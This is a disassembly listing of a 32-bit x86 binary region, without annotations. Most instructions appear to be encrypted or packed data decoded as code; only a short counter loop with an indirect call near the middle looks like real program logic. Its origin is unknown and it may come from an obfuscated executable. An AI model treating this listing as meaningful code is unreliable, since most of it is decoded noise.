  409a66:	cmp    BYTE PTR [esi-0x628a544b],dh
  409a6c:	imul   edx,DWORD PTR [eax+0x59],0x1e
  409a70:	jle    0x409aa8
  409a72:	pop    ds
  409a73:	loope  0x409ac0
  409a75:	div    DWORD PTR [edx+0x20]
  409a78:	icebp  
  409a79:	add    DWORD PTR [ecx-0x7f],0x43
  409a7d:	push   0x52
  409a7f:	outs   dx,BYTE PTR ds:[esi]
  409a80:	inc    ebp
  409a81:	ss sbb eax,0x8b7b0ca5
  409a87:	jmp    0xe799:0x8f64cbe7
  409a8e:	xor    edx,0xf5623d68
  409a94:	push   0x3116f1dc
  409a99:	xor    eax,eax
  409a9b:	bound  ebp,QWORD PTR ds:0x11b9786e
  409aa1:	dec    esp
  409aa2:	daa    
  409aa3:	push   esp
  409aa4:	shr    BYTE PTR [edx+0x61],1
  409aa7:	leave  
  409aa8:	jne    0x409a30
  409aaa:	or     esp,ebp
  409aac:	sbb    ecx,ebx
  409aae:	das    
  409aaf:	clc    
  409ab0:	arpl   WORD PTR [ecx-0x45],bx
  409ab3:	push   edx
  409ab4:	jns    0x409abf
  409ab6:	add    eax,0xdbc2e07e
  409abb:	fld    QWORD PTR [ebp+0x33f1c8c5]
  409ac1:	mov    edx,0xbed3f0fe
  409ac6:	xchg   esp,eax
  409ac7:	pop    ebx
  409ac8:	es into 
  409aca:	jne    0x409ab4
  409acc:	or     al,0xca
  409ace:	xor    eax,DWORD PTR [edx+0x13d926]
  409ad4:	aam    0x68
  409ad6:	cmp    bl,BYTE PTR [eax]
  409ad8:	cmp    al,0x1f
  409ada:	and    al,0x93
  409adc:	push   esp
  409add:	es mov ch,0x9a
  409ae0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  409ae2:	in     al,0x9b
  409ae4:	jae    0x409b0e
  409ae6:	into   
  409ae7:	repz cmp bl,ch
  409aea:	out    dx,al
  409aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aec:	aaa    
  409aed:	xor    DWORD PTR [eax+0x1d],0x68
  409af1:	jnp    0x409aec
  409af3:	je     0x409ae4
  409af5:	xor    DWORD PTR [esi-0x4c405798],ebx
  409afb:	fiadd  WORD PTR [eax+0x44]
  409afe:	retf   0xc01b
  409b01:	cmc    
  409b02:	push   ebp
  409b03:	cmp    BYTE PTR [ebx-0x49c9d29e],bh
  409b09:	jg     0x409ab9
  409b0b:	adc    edx,eax
  409b0d:	inc    ecx
  409b0e:	xor    esp,DWORD PTR [esi+0x671e94b5]
  409b14:	lea    esi,[esi]
  409b16:	sbb    DWORD PTR [ebx+edi*8-0x66e10aa6],esp
  409b1d:	push   ecx
  409b1e:	adc    esi,0x21
  409b21:	test   eax,0x43d77d59
  409b26:	jle    0x409af3
  409b28:	jle    0x409b64
  409b2a:	push   esi
  409b2b:	mov    edi,0x64836092
  409b30:	(bad)  
  409b31:	pop    eax
  409b32:	aam    0x65
  409b34:	mov    edx,0x3bff5374
  409b39:	sbb    al,0xb4
  409b3b:	and    bh,BYTE PTR [esp+edx*8+0xef6fa96]
  409b42:	jnp    0x409b6f
  409b44:	test   al,0xa
  409b46:	push   0x3b23696e
  409b4b:	mov    dl,0x68
  409b4d:	inc    ecx
  409b4e:	mov    esi,0x992a3726
  409b53:	pop    esp
  409b54:	nop    DWORD PTR [ebx]
  409b57:	pop    eax
  409b58:	pop    esi
  409b59:	das    
  409b5a:	jmp    0xd66:0xaf1e97e7
  409b61:	sbb    al,0x25
  409b63:	pop    edx
  409b64:	pop    ecx
  409b65:	repnz mov esp,0x57df0212
  409b6b:	adc    eax,0xf7c18902
  409b70:	idiv   DWORD PTR [ebx-0x7c]
  409b73:	hlt    
  409b74:	std    
  409b75:	out    0x6b,al
  409b77:	mov    ch,0x16
  409b79:	lahf   
  409b7a:	cmp    al,0x9a
  409b7c:	mov    dh,0x9d
  409b7e:	mov    ah,0x67
  409b80:	ss popa 
  409b82:	or     al,0xba
  409b84:	cmp    ecx,edx
  409b86:	and    BYTE PTR [ebx+eax*2],dh
  409b89:	pusha  
  409b8a:	inc    edi
  409b8b:	stos   BYTE PTR es:[edi],al
  409b8c:	sub    edx,DWORD PTR [ecx]
  409b8e:	gs pop ebx
  409b90:	or     BYTE PTR [ecx-0x32],cl
  409b93:	lea    eax,[ebx]
  409b95:	jle    0x409bae
  409b97:	jp     0x409bc2
  409b99:	dec    edx
  409b9a:	les    edx,FWORD PTR [ecx+edi*2]
  409b9d:	cmp    al,BYTE PTR [edx-0x69198026]
  409ba3:	mov    ch,0x9
  409ba5:	lods   al,BYTE PTR ds:[esi]
  409ba6:	mov    cs,WORD PTR [edx]
  409ba8:	sub    DWORD PTR [eax+0x48],ebx
  409bab:	mov    dl,0x1e
  409bad:	fcmovnb st,st(7)
  409baf:	mov    ebp,0xeb71c23c
  409bb4:	cmp    al,0x66
  409bb6:	out    dx,al
  409bb7:	test   BYTE PTR [ebx],0xb
  409bba:	shr    DWORD PTR [esi+eiz*1],1
  409bbd:	js     0x409bb3
  409bbf:	pop    ebx
  409bc0:	ret    
  409bc1:	xchg   BYTE PTR [edx-0x30e2047b],al
  409bc7:	aam    0x4a
  409bc9:	sbb    DWORD PTR [eax-0x5c],ecx
  409bcc:	loope  0x409c4d
  409bce:	fcom   QWORD PTR [ebx]
  409bd0:	(bad)  
  409bd1:	shr    al,0xdd
  409bd4:	sbb    BYTE PTR [esi+0x6c5f629],dh
  409bda:	push   0x2692b085
  409bdf:	fwait
  409be0:	push   eax
  409be1:	ja     0x409ba6
  409be3:	(bad)
  409be7:	jle    0x409be1
  409be9:	sbb    dl,bh
  409beb:	mov    ebx,es
  409bed:	mov    ecx,0xbf7ca147
  409bf2:	rep lods al,BYTE PTR ds:[esi]
  409bf4:	inc    eax
  409bf5:	stos   BYTE PTR es:[edi],al
  409bf6:	retf   
  409bf7:	xchg   edx,eax
  409bf8:	jno    0x409bf5
  409bfa:	(bad)  
  409bfb:	enter  0xa023,0x1d
  409bff:	cmp    DWORD PTR [esp+esi*4-0x3b],edi
  409c03:	mov    ?,WORD PTR [ecx-0x6fcbbbc5]
  409c09:	out    dx,al
  409c0a:	fstp   st(7)
  409c0c:	push   edi
  409c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c0e:	outs   dx,DWORD PTR ds:[esi]
  409c0f:	jns    0x409bb7
  409c11:	stos   DWORD PTR es:[edi],eax
  409c12:	popf   
  409c13:	pop    ds
  409c14:	leave  
  409c15:	sbb    eax,eax
  409c17:	out    0xfd,eax
  409c19:	jb     0x409c94
  409c1b:	cdq    
  409c1c:	and    ebx,DWORD PTR [edx-0x6d1375cc]
  409c22:	ficomp WORD PTR [edi+0x76]
  409c25:	scas   eax,DWORD PTR es:[edi]
  409c26:	push   esi
  409c27:	adc    al,0xab
  409c29:	ins    DWORD PTR es:[edi],dx
  409c2a:	stc    
  409c2b:	cmp    edx,DWORD PTR [esi]
  409c2d:	fs mov esp,0xc09ddfc9
  409c33:	jecxz  0x409cae
  409c35:	sahf   
  409c36:	mov    ebp,0x7538f104
  409c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c3c:	pop    eax
  409c3d:	mov    DWORD PTR [eax+0x4166b809],esi
  409c43:	mov    dh,0x22
  409c45:	sub    BYTE PTR [ebx+0x3a],bl
  409c48:	es (bad) 
  409c4a:	ror    BYTE PTR [eax-0xa51b2],1
  409c50:	aad    0x83
  409c52:	clc    
  409c53:	mov    esp,0x6dd014af
  409c58:	push   esp
  409c59:	es daa 
  409c5b:	imul   esi,DWORD PTR [edx],0xd64a8ed9
  409c61:	xchg   esp,eax
  409c62:	fs mov esp,0x478fcef5
  409c68:	(bad)  
  409c69:	stos   BYTE PTR es:[edi],al
  409c6a:	hlt    
  409c6b:	mov    WORD PTR [edi+0x1543ec8a],ss
  409c71:	xor    al,0xcb
  409c73:	sti    
  409c74:	mov    BYTE PTR [ebx],dh
  409c76:	repnz adc eax,0x24d646ad
  409c7c:	test   eax,0x5e99f8fa
  409c81:	pop    ebx
  409c82:	fstp   TBYTE PTR [edx+0x62cee302]
  409c88:	mov    al,ds:0x3cda04d8
  409c8d:	call   FWORD PTR [eax+ebx*8+0x56bfd797]
  409c94:	sub    BYTE PTR [edx-0x2b],bh
  409c97:	daa    
  409c98:	sbb    BYTE PTR [esi-0x26d552ed],ah
  409c9e:	out    dx,al
  409c9f:	ret    
  409ca0:	sbb    DWORD PTR [ecx-0x264eded9],eax
  409ca6:	(bad)  
  409ca7:	jne    0x409ce5
  409ca9:	or     ebp,eax
  409cab:	mov    ch,0x8
  409cad:	xchg   edx,eax
  409cae:	jns    0x409c73
  409cb0:	out    0xa7,eax
  409cb2:	inc    edi
  409cb3:	adc    eax,0x6ec31a4b
  409cb8:	and    al,0x7a
  409cba:	fwait
  409cbb:	mov    ecx,0xbae59344
  409cc0:	mov    ds:0x909c82c8,al
  409cc5:	scas   eax,DWORD PTR es:[edi]
  409cc6:	and    al,0xfe
  409cc8:	adc    al,0x4c
  409cca:	scas   eax,DWORD PTR es:[edi]
  409ccb:	ja     0x409ced
  409ccd:	scas   al,BYTE PTR es:[edi]
  409cce:	in     eax,0xe7
  409cd0:	test   BYTE PTR [ebp+0x25],cl
  409cd3:	jmp    0xc07c6d8
  409cd8:	repnz loopne 0x409d27
  409cdb:	imul   edi,DWORD PTR [eax+0x3d251dee],0x2a043c5
  409ce5:	je     0x409cd5
  409ce7:	icebp  
  409ce8:	loope  0x409cab
  409cea:	clc    
  409ceb:	pop    edx
  409cec:	test   al,0xa3
  409cee:	xor    eax,0xfa53d9d5
  409cf3:	mov    cs,eax
  409cf5:	pop    ecx
  409cf6:	fsubr  DWORD PTR [ebx+0x10fe67b3]
  409cfc:	bound  ebx,QWORD PTR [edx+0x77330182]
  409d02:	ins    DWORD PTR es:[edi],dx
  409d03:	pop    eax
  409d04:	add    ebx,DWORD PTR [ebx+0x1b]
  409d07:	cmp    DWORD PTR [edi],esi
  409d09:	pop    eax
  409d0a:	mov    ecx,0xcbb53f89
  409d0f:	lea    ebp,[edx]
  409d11:	(bad)  
  409d12:	jl     0x409cb8
  409d14:	int    0xb
  409d16:	bound  ebp,QWORD PTR [edi]
  409d18:	jb     0x409d15
  409d1a:	push   ecx
  409d1b:	aam    0x64
  409d1d:	or     eax,eax
  409d1f:	test   DWORD PTR [ecx],edx
  409d21:	mov    al,0x25
  409d23:	mov    edx,0x539f7cc0
  409d28:	jge    0x409d00
  409d2a:	adc    ch,BYTE PTR [edx+esi*1+0xa]
  409d2e:	out    0x3f,eax
  409d30:	push   ebp
  409d31:	je     0x409cf1
  409d33:	mov    esi,0x5a246c26
  409d38:	push   eax
  409d39:	int3   
  409d3a:	sub    edi,esp
  409d3c:	jo     0x409d7d
  409d3e:	cli    
  409d3f:	ffreep st(4)
  409d41:	dec    ebx
  409d42:	sbb    DWORD PTR [esi],0xffffffe2
  409d45:	fld    DWORD PTR [ebp+0x375a63af]
  409d4b:	popf   
  409d4c:	mov    edi,0xe330cbc7
  409d51:	sub    ch,bl
  409d53:	into   
  409d54:	push   ss
  409d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d56:	xlat   BYTE PTR ds:[ebx]
  409d57:	mov    ecx,0x7730bd1c
  409d5c:	lock jmp 0x409d26
  409d5f:	mov    dh,0x79
  409d61:	xor    esi,DWORD PTR [edi-0x66]
  409d64:	cmovg  esi,DWORD PTR [esi+0x596d5d76]
  409d6b:	xchg   edi,eax
  409d6c:	scas   al,BYTE PTR es:[edi]
  409d6d:	xchg   DWORD PTR [eax+0x4b],ecx
  409d70:	fwait
  409d71:	loope  0x409d77
  409d73:	sbb    al,0x85
  409d75:	fs (bad) 
  409d77:	retf   
  409d78:	pop    ebx
  409d79:	(bad)  
  409d7b:	sbb    al,0xf1
  409d7d:	inc    ecx
  409d7e:	pop    ss
  409d7f:	xchg   esi,eax
  409d80:	fdiv   QWORD PTR [esp]
  409d83:	or     ah,BYTE PTR [ebx+0x2a5872bd]
  409d89:	scas   al,BYTE PTR es:[edi]
  409d8a:	or     esp,DWORD PTR [bp+si+0x20]
  409d8e:	jno    0x409db2
  409d90:	pop    ebp
  409d91:	jne    0x409de2
  409d93:	adc    DWORD PTR [ebx+0x3f2abb2e],ebp
  409d99:	retf   0xf8ff
  409d9c:	ins    DWORD PTR es:[edi],dx
  409d9d:	jge    0x409ded
  409d9f:	ins    DWORD PTR es:[edi],dx
  409da0:	stos   BYTE PTR es:[edi],al
  409da1:	rcr    BYTE PTR [edi+0x16422fa3],1
  409da7:	push   es
  409da8:	push   ecx
  409da9:	mov    ?,ebp
  409dab:	int3   
  409dac:	stos   DWORD PTR es:[edi],eax
  409dad:	lods   al,BYTE PTR ds:[esi]
  409dae:	mov    ecx,0x8d04d15e
  409db3:	cmp    eax,0xed02f240
  409db8:	cmp    DWORD PTR [eax-0x43],edx
  409dbb:	add    ah,BYTE PTR [edi+0x5fb2de32]
  409dc1:	stc    
  409dc2:	stos   BYTE PTR es:[edi],al
  409dc3:	sub    DWORD PTR ds:0x3aa71501,esp
  409dc9:	iret   
  409dca:	and    eax,0xfce49eb4
  409dcf:	jnp    0x409db5
  409dd1:	mov    ecx,ebx
  409dd3:	mov    ch,0x11
  409dd5:	(bad)  
  409dd7:	mov    edi,DWORD PTR [eax-0x32]
  409dda:	add    BYTE PTR [ecx-0x77ec9162],dl
  409de0:	(bad)  
  409de1:	stos   BYTE PTR es:[edi],al
  409de2:	mov    DWORD PTR [ebp+0x4d],ebp
  409de5:	pop    ecx
  409de6:	or     bh,BYTE PTR [ebx+ecx*8+0x12d49b36]
  409ded:	bnd jb 0x409d8d
  409df0:	ins    DWORD PTR es:[edi],dx
  409df1:	pop    ss
  409df2:	add    eax,0xa93d7d54
  409df7:	fst    QWORD PTR [eax]
  409df9:	xchg   esi,eax
  409dfa:	in     al,0x9f
  409dfc:	adc    BYTE PTR [ecx+0x336e0a4a],cl
  409e02:	or     DWORD PTR [edx+edi*4+0x31d10300],ebp
  409e09:	or     eax,0x42fd8a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	mov    WORD PTR [eax+0x28],ss
  409e84:	cmp    BYTE PTR [esi],ah
  409e86:	call   0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	pop    edx
  409e8e:	inc    edx
  409e8f:	push   0xffffffa8
  409e91:	add    esi,DWORD PTR ds:0xffecfa1e
  409e97:	mov    eax,ds:0x59416e22
  409e9c:	push   ecx
  409e9d:	mov    al,0xd9
  409e9f:	lods   al,BYTE PTR ds:[esi]
  409ea0:	cmp    BYTE PTR [edi+0x487cd629],dl
  409ea6:	sti    
  409ea7:	xor    ebx,DWORD PTR [edx]
  409ea9:	or     esp,edx
  409eab:	fisub  WORD PTR [ebx]
  409ead:	into   
  409eae:	in     al,0x1d
  409eb0:	and    esp,ebp
  409eb2:	int    0x71
  409eb4:	sub    BYTE PTR [eax-0x1728967c],ch
  409eba:	mov    ch,0x8c
  409ebc:	xchg   ebx,eax
  409ebd:	add    eax,0x438be370
  409ec2:	adc    edi,DWORD PTR [edi-0x40]
  409ec5:	popa   
  409ec6:	sbb    al,0xbc
  409ec8:	ds stos DWORD PTR es:[edi],eax
  409eca:	lahf   
  409ecb:	xchg   ecx,eax
  409ecc:	fbld   TBYTE PTR [ebp-0x2db21d56]
  409ed2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409ed4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  409ed6:	and    ecx,esp
  409ed8:	iret   
  409ed9:	jb     0x409ee5
  409edb:	xor    eax,0x46098f9e
  409ee0:	ins    DWORD PTR es:[edi],dx
  409ee1:	jmp    0x409ed6
  409ee3:	daa    
  409ee4:	adc    bh,BYTE PTR [eax+0x20]
  409ee7:	adc    eax,0xf4d50d0e
  409eec:	lahf   
  409eed:	mov    ebx,0x97685932
  409ef2:	inc    ebx
  409ef3:	mov    bh,0xc5
  409ef5:	mov    dl,0x13
  409ef7:	lods   al,BYTE PTR fs:[esi]
  409ef9:	adc    ebx,DWORD PTR [eax-0x19]
  409efc:	sub    eax,0x500b1bee
  409f01:	mov    al,ds:0xd977bca0
  409f06:	cwde   
  409f07:	outs   dx,DWORD PTR ds:[esi]
  409f08:	jmp    0x5069a1de
  409f0d:	xchg   ecx,eax
  409f0e:	ins    DWORD PTR es:[edi],dx
  409f0f:	scas   eax,DWORD PTR es:[edi]
  409f10:	loope  0x409f80
  409f12:	cmp    bl,BYTE PTR [edx-0x70c7b8ed]
  409f18:	test   al,0xf3
  409f1a:	lods   al,BYTE PTR ds:[esi]
  409f1b:	and    ecx,DWORD PTR [esi-0x72]
  409f1e:	dec    eax
  409f1f:	shl    bl,0xf2
  409f22:	retf   
  409f23:	cmp    BYTE PTR [eax+0x5],bh
  409f26:	push   ecx
  409f27:	mov    cl,0x70
  409f29:	adc    al,0x49
  409f2b:	cmp    eax,0xf91dd164
  409f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f31:	sub    eax,0x167db122
  409f36:	xor    esp,DWORD PTR [eax]
  409f38:	xchg   edx,eax
  409f39:	push   ss
  409f3a:	mov    ebp,0xeda376f6
  409f3f:	or     DWORD PTR [ecx+0x35],esi
  409f42:	jmp    0x1da9:0xf520368b
  409f49:	(bad)  
  409f4a:	imul   DWORD PTR [esi+0x3ebcadc6]
  409f50:	cld    
  409f51:	les    esp,FWORD PTR [eax+0x26a27302]
  409f57:	mov    dh,0x49
  409f59:	pop    esi
  409f5a:	ret    0xb6e3
  409f5d:	clc    
  409f5e:	int    0x40
  409f60:	retf   0x9203
  409f63:	mov    DWORD PTR [ebp+0x7f371d8c],ebx
  409f69:	rep ins DWORD PTR es:[edi],dx
  409f6b:	and    ebx,DWORD PTR [edx]
  409f6d:	jmp    0x5a99:0xa9b9dcaa
  409f74:	stc    
  409f75:	pop    es
  409f76:	dec    ebx
  409f77:	inc    esp
  409f78:	call   0xc896:0xd781bf61
  409f7f:	mov    cl,0x27
  409f81:	je     0x409fae
  409f83:	jecxz  0x409fd1
  409f85:	xchg   ecx,eax
  409f86:	sbb    DWORD PTR [ecx-0x7d],edi
  409f89:	(bad)  
  409f8a:	sbb    ebx,DWORD PTR [esi+0x2a]
  409f8d:	cwde   
  409f8e:	cdq    
  409f8f:	dec    edi
  409f90:	out    dx,al
  409f91:	sahf   
  409f92:	aaa    
  409f93:	lock pop edx
  409f95:	out    dx,al
  409f96:	(bad)  
  409f97:	mov    ch,0x2
  409f99:	pop    esp
  409f9a:	mov    esi,0x2728f3e8
  409f9f:	popf   
  409fa0:	xor    BYTE PTR [ecx-0x5229eb95],ah
  409fa6:	iret   
  409fa7:	in     eax,0x5
  409fa9:	push   ecx
  409faa:	inc    edx
  409fab:	sahf   
  409fac:	iret   
  409fad:	add    BYTE PTR [eax-0x66],bh
  409fb0:	repz or BYTE PTR [edx-0x37b35eb6],bh
  409fb7:	inc    eax
  409fb8:	cmp    DWORD PTR [eax],eax
  409fba:	das    
  409fbb:	xchg   DWORD PTR [ebp-0x5d],esp
  409fbe:	xchg   esp,ebx
  409fc0:	retf   0xe81f
  409fc3:	leave  
  409fc4:	pop    ss
  409fc5:	dec    edi
  409fc6:	xchg   edi,eax
  409fc7:	outs   dx,BYTE PTR ds:[esi]
  409fc8:	cmp    ebp,edi
  409fca:	mov    es,WORD PTR [ebp-0x570c2293]
  409fd0:	inc    esp
  409fd1:	outs   dx,BYTE PTR ds:[esi]
  409fd2:	mov    al,ds:0x616fbed2
  409fd7:	or     ax,bp
  409fda:	dec    ebx
  409fdb:	jmp    0x4004:0x359b3d4c
  409fe2:	mov    ch,0x80
  409fe4:	inc    esp
  409fe5:	(bad)  
  409fe6:	mov    bh,0x7f
  409fe8:	add    BYTE PTR [edi+0x71],ch
  409feb:	movzx  ecx,WORD PTR [esi+0x6a]
  409fef:	push   0xfffffffc
  409ff1:	fwait
  409ff2:	aaa    
  409ff3:	(bad)  
  409ff4:	fisttp QWORD PTR [ebx]
  409ff6:	push   esp
  409ff7:	in     eax,dx
  409ff8:	inc    edi
  409ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ffa:	xchg   ecx,eax
  409ffb:	stos   BYTE PTR es:[edi],al
  409ffc:	jne    0x40a000
  409ffe:	shr    BYTE PTR [esp+edx*2+0x30],0x35
  40a003:	cs loopne 0x40a07c
  40a006:	rcr    ecx,0x7a
  40a009:	sub    eax,0x942bb7d7
  40a00e:	test   cl,al
  40a010:	push   0xbe20f107
  40a015:	lea    ebp,[edi]
  40a017:	aaa    
  40a018:	xchg   edi,eax
  40a019:	adc    ch,BYTE PTR [ebx]
  40a01b:	jg     0x40a041
  40a01d:	call   0x6421:0x8314b655
  40a024:	mov    ds:0x5ec0dda2,al
  40a029:	dec    edx
  40a02a:	push   ebp
  40a02b:	jae    0x409fce
  40a02d:	push   eax
  40a02e:	(bad)  
  40a02f:	retf   
  40a030:	stc    
  40a031:	fsub   DWORD PTR [ecx+0xb07b5fd]
  40a037:	mov    edx,0x714b3a71
  40a03c:	adc    al,0x60
  40a03e:	fidiv  WORD PTR [eax+0x6f]
  40a041:	lods   eax,DWORD PTR ds:[esi]
  40a042:	shl    eax,cl
  40a044:	in     al,0x5f
  40a046:	push   ebp
  40a047:	dec    eax
  40a048:	fild   DWORD PTR [edi]
  40a04a:	je     0x40a088
  40a04c:	adc    DWORD PTR gs:[ebp+0xf],ebp
  40a050:	adc    DWORD PTR [edx-0x4731b48],0x2894a6bd
  40a05a:	mov    ebx,0x4a07672e
  40a05f:	sti    
  40a060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a061:	xchg   edi,eax
  40a062:	push   esi
  40a063:	mov    DWORD PTR [edi-0x41],ebx
  40a066:	push   eax
  40a067:	sub    DWORD PTR [edi-0x4665c4bd],0xa7468380
  40a071:	ret    
  40a072:	pop    ebx
  40a073:	dec    esi
  40a074:	out    0x5d,al
  40a076:	jne    0x40a0d5
  40a078:	add    eax,0xe03e663d
  40a07d:	cld    
  40a07e:	shl    DWORD PTR [ebp-0x408947d3],cl
  40a084:	dec    edx
  40a085:	jbe    0x40a0c0
  40a087:	pop    esp
  40a088:	xchg   edx,eax
  40a089:	and    al,0x73
  40a08b:	cmp    bl,dl
  40a08d:	push   ebp
  40a08e:	iret   
  40a08f:	xor    eax,0xffffffc3
  40a092:	push   edi
  40a093:	xor    bl,BYTE PTR [ebx-0x1a992091]
  40a099:	les    ebp,FWORD PTR [edi]
  40a09b:	imul   ebp,DWORD PTR [esp+edi*2-0x64],0xffffffb1
  40a0a0:	mov    esp,0xb5878428
  40a0a5:	jae    0x40a0e7
  40a0a7:	dec    ebp
  40a0a8:	cmc    
  40a0a9:	pop    es
  40a0aa:	add    al,0xf7
  40a0ac:	cwde   
  40a0ad:	mov    ah,0xeb
  40a0af:	stos   BYTE PTR es:[edi],al
  40a0b0:	xchg   ecx,eax
  40a0b1:	sbb    bh,BYTE PTR [ebp+ecx*1+0x70]
  40a0b5:	nop
  40a0b6:	cld    
  40a0b7:	push   ebp
  40a0b8:	or     ecx,DWORD PTR [ebx-0x4691ce57]
  40a0be:	fist   DWORD PTR [edx+0x537f76ee]
  40a0c4:	push   es
  40a0c5:	inc    edi
  40a0c6:	je     0x40a0aa
  40a0c8:	retf   0xbcb3
  40a0cb:	sub    al,0xb4
  40a0cd:	sahf   
  40a0ce:	pop    eax
  40a0cf:	iret   
  40a0d0:	and    ebp,DWORD PTR [ecx-0x5a08e666]
  40a0d6:	pop    ebp
  40a0d7:	or     eax,0xb5fc0369
  40a0dc:	aas    
  40a0dd:	sub    edi,esi
  40a0df:	std    
  40a0e0:	sub    bh,BYTE PTR [esi+0x1a]
  40a0e3:	dec    esp
  40a0e4:	push   es
  40a0e5:	dec    esp
  40a0e6:	inc    ecx
  40a0e7:	pop    esp
  40a0e8:	bound  edx,QWORD PTR [esi+ebx*2-0x48]
  40a0ec:	jmp    0x40a0fc
  40a0ee:	int3   
  40a0ef:	pop    es
  40a0f0:	inc    ecx
  40a0f1:	xchg   edi,eax
  40a0f2:	lods   al,BYTE PTR ds:[esi]
  40a0f3:	retf   
  40a0f4:	mov    WORD PTR [ebx-0x7f],ss
  40a0f7:	dec    ebx
  40a0f8:	mov    ah,0xaf
  40a0fa:	xor    BYTE PTR [ebp+eax*2+0x791f5e24],al
  40a101:	lds    esi,FWORD PTR [edx+0x7725d90b]
  40a107:	jo     0x40a100
  40a109:	stc    
  40a10a:	test   BYTE PTR [eax+0x7],al
  40a10d:	lock cli 
  40a10f:	and    al,0x80
  40a111:	jbe    0x40a09d
  40a113:	or     esp,0xb01413b9
  40a119:	(bad)  
  40a11a:	stc    
  40a11b:	ins    DWORD PTR es:[edi],dx
  40a11c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a11d:	and    dh,BYTE PTR [edx+0x39]
  40a120:	fsubr  DWORD PTR [ebp+0x1d]
  40a123:	js     0x40a17a
  40a125:	shl    BYTE PTR [edi+0x38b335aa],1
  40a12b:	jmp    0xd3ffd6b4
  40a130:	shl    bl,0xd3
  40a133:	fidiv  DWORD PTR [edi]
  40a135:	pop    eax
  40a136:	cmp    BYTE PTR [eax+0x2147e959],dh
  40a13c:	nop/reserved BYTE PTR [esi+0x9]
  40a140:	outs   dx,BYTE PTR ds:[esi]
  40a141:	pop    edx
  40a142:	pusha  
  40a143:	not    DWORD PTR [ebp-0x65]
  40a146:	and    DWORD PTR [ebx+0x5a],esp
  40a149:	imul   ebp,DWORD PTR [ecx+0x7e],0xffffffab
  40a14d:	dec    esi
  40a14e:	je     0x40a12c
  40a150:	call   0x5815:0x39554aa6
  40a157:	test   eax,0x42f04979
  40a15c:	loopne 0x40a132
  40a15e:	outs   dx,BYTE PTR ds:[esi]
  40a15f:	inc    eax
  40a160:	push   edi
  40a161:	sbb    eax,0xe4db0e8b
  40a166:	mov    WORD PTR [ebp-0x2c],fs
  40a169:	int    0x6f
  40a16b:	and    al,0x38
  40a16d:	fldcw  WORD PTR [edi]
  40a16f:	rcl    DWORD PTR [ebx-0x7cfda7b7],1
  40a175:	out    0x89,al
  40a177:	sub    eax,0x5795bc5
  40a17c:	jae    0x40a109
  40a17e:	repnz pop edi
  40a180:	inc    esp
  40a181:	iret   
  40a182:	leave  
  40a183:	add    al,0xb0
  40a185:	and    BYTE PTR [esi+0x3c07b7c3],dl
  40a18b:	add    dl,BYTE PTR [edx+0x5d3cb7e6]
  40a191:	ret    
  40a192:	jg     0x40a12c
  40a194:	retf   
  40a195:	or     al,0x33
  40a197:	enter  0xc55d,0xcc
  40a19b:	or     eax,0xad30a8a6
  40a1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1a1:	cli    
  40a1a2:	adc    al,0xd9
  40a1a4:	cs jmp 0x17ebabab
  40a1aa:	xchg   ecx,eax
  40a1ab:	add    DWORD PTR [edi-0x73ce3c18],ecx
  40a1b1:	mov    ch,0x86
  40a1b3:	push   ebx
  40a1b4:	add    DWORD PTR [edx],ebp
  40a1b6:	xor    bl,BYTE PTR [edx+0x555d0f3]
  40a1bc:	out    dx,eax
  40a1bd:	js     0x40a17e
  40a1bf:	data16 int3 
  40a1c1:	std    
  40a1c2:	adc    edx,eax
  40a1c4:	sbb    al,0xc6
  40a1c6:	scas   al,BYTE PTR es:[edi]
  40a1c7:	loop   0x40a18e
  40a1c9:	fidivr DWORD PTR [ebp+0x5b333a69]
  40a1cf:	in     al,0xe
  40a1d1:	sbb    edi,DWORD PTR [ebx+edi*4]
  40a1d4:	xchg   esp,eax
  40a1d5:	arpl   WORD PTR [esi-0x3a8c683e],cx
  40a1db:	xor    eax,0x61851556
  40a1e0:	or     al,0xe8
  40a1e2:	scas   al,BYTE PTR es:[edi]
  40a1e3:	push   eax
  40a1e4:	mov    bh,0xc3
  40a1e6:	cmc    
  40a1e7:	xor    dl,dh
  40a1e9:	cmp    eax,0xb0e15a5b
  40a1ee:	sub    BYTE PTR ds:0x4320c87,dh
  40a1f4:	inc    esp
  40a1f5:	cmp    esi,DWORD PTR [edi+eax*8]
  40a1f8:	clc    
  40a1f9:	retf   0x1b38
  40a1fc:	aas    
  40a1fd:	xor    eax,0xf2f114c
  40a202:	or     eax,0xa9bd5036
  40a207:	sar    ebp,1
  40a209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a20a:	mov    esi,0x8434c719
  40a20f:	inc    edi
  40a210:	loopne 0x40a268
  40a212:	imul   edi,DWORD PTR [esi+esi*4+0x4],0x7468d518
